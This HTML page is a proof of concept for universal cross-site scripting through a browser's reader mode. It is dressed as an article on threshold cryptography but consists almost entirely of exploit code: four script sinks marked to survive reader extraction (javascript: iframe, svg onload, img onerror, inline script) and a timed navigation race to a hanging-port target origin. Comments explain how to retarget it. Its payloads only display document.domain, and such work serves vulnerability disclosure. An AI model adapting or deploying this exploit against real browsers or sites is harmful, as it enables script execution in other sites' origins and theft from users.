<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>The Long Guide to Threshold Cryptography — A Benign Reader Article</title>
    <meta name="author" content="Research Desk">
    <style>
    :root {
        color-scheme: light dark
    }

    body {
        margin: 0;
        font-family: system-ui, sans-serif
    }

    #source {
        max-width: 760px;
        margin: 24px auto;
        line-height: 1.5;
        padding: 0 16px
    }

    #cover {
        position: fixed;
        inset: 0;
        z-index: 10;
        display: grid;
        place-items: center;
        background: Canvas
    }

    #cue {
        padding: 16px 26px;
        border: 0;
        border-radius: 14px;
        background: #555;
        color: #fff;
        font: 700 18px system-ui
    }

    #cue.go {
        background: #c00020
    }

    .keepframe {
        width: 1px;
        height: 1px;
        border: 0
    }

    svg {
        width: 1px;
        height: 1px
    }
    </style>
</head>
<body>
    <!--
      TARGET (victim origin) is HARDCODED as a literal in each sink's guard + the nav-race below,
      because reader mode strips the main <script>, so each sink must be self-contained and carry
      its own origin check. To change the target, find/replace:  https://example.com:88
      Use a HANGING port (e.g. :88) so the navigation stays pending and the article is extracted.
      BENIGN: each sink only fires its proof WHEN the reader view's origin == TARGET, and proves
      cross-origin execution via document.domain ONLY — no cookies / no user data are read.
    -->
    <article id="source">
        <h1>The Long Guide to Threshold Cryptography</h1>
        <p>
            <em>Benign reader-UXSS probe. Fires only in the TARGET origin; proves via document.domain.</em>
        </p>

        <!-- SINK 1: javascript: iframe kept by Mercury/Postlight (mercury-parser-keep); acts on parent (reader doc) -->
        <iframe class="mercury-parser-keep keepframe" src="javascript:(function(){try{if(parent.location.origin==='https://example.com:88'){var d=parent.document;d.open();d.write('<!doctype html><meta name=viewport content=width=device-width,initial-scale=1><title>uxss</title><body style=font-family:system-ui;padding:20px><h1 style=color:#c00>BENIGN UXSS PROOF</h1><p>sink=js-iframe</p><p>document.domain=<b>'+d.domain+'</b></p><p>window===top:'+(parent===parent.top)+'</p><p style=color:#555>no cookies/data read</p>');d.close();parent.alert('BENIGN UXSS PROOF sink=js-iframe domain='+d.domain)}}catch(e){}})()"></iframe>

        <!-- SINK 2: svg onload kept; acts on its own (reader) document -->
        <svg class="mercury-parser-keep" xmlns="http://www.w3.org/2000/svg" onload="try{if(location.origin==='https://example.com:88'){document.open();document.write('<h1 style=color:#c00>BENIGN UXSS PROOF</h1><p>sink=svg-onload</p><p>document.domain=<b>'+document.domain+'</b></p>');document.close();alert('BENIGN UXSS PROOF sink=svg domain='+document.domain)}}catch(e){}"></svg>

        <!-- SINK 3: img onerror kept -->
        <img class="mercury-parser-keep" src="x" alt="" onerror="try{if(location.origin==='https://example.com:88'){document.open();document.write('<h1 style=color:#c00>BENIGN UXSS PROOF</h1><p>sink=img-onerror</p><p>document.domain=<b>'+document.domain+'</b></p>');document.close();alert('BENIGN UXSS PROOF sink=img domain='+document.domain)}}catch(e){}">

        <!-- SINK 4: inline script kept -->
        <script class="mercury-parser-keep">
        try {
            if (location.origin === 'https://example.com:88') {
                document.open();
                document.write('<h1 style=color:#c00>BENIGN UXSS PROOF</h1><p>sink=inline-script</p><p>document.domain=<b>' + document.domain + '</b></p>');
                document.close();
                alert('BENIGN UXSS PROOF sink=script domain=' + document.domain)
            }
        } catch (e) {}
        </script>

        <p id="padding"></p>
    </article>

    <div id="cover">
        <button id="cue" type="button" disabled>WAIT</button>
    </div>

    <script>
    (() => {
        const params = new URLSearchParams(location.search);
        const num = (n, def, min, max) => {
            const v = Number(params.get(n));
            return Number.isFinite(v) ? Math.min(max, Math.max(min, v)) : def;
        };
        const delay = num('delay', 15000, 5000, 60000);
        const lead = num('lead', 500, 100, 1200);
        const cue = document.querySelector('#cue');

        document.querySelector('#padding').textContent =
        'Reader extraction padding keeps article conversion busy. '.repeat(19000);

        setTimeout(() => {
            cue.textContent = 'TAP READER MODE NOW';
            cue.classList.add('go');
        }, delay - lead);
        // nav-race to the HANGING target so the pending origin becomes TARGET; then tap Reader Mode.
        setTimeout(() => {
            try {
                location.assign('https://example.com:88');
            } catch (e) {}
        }, delay);
    })();
    </script>
</body>
</html>
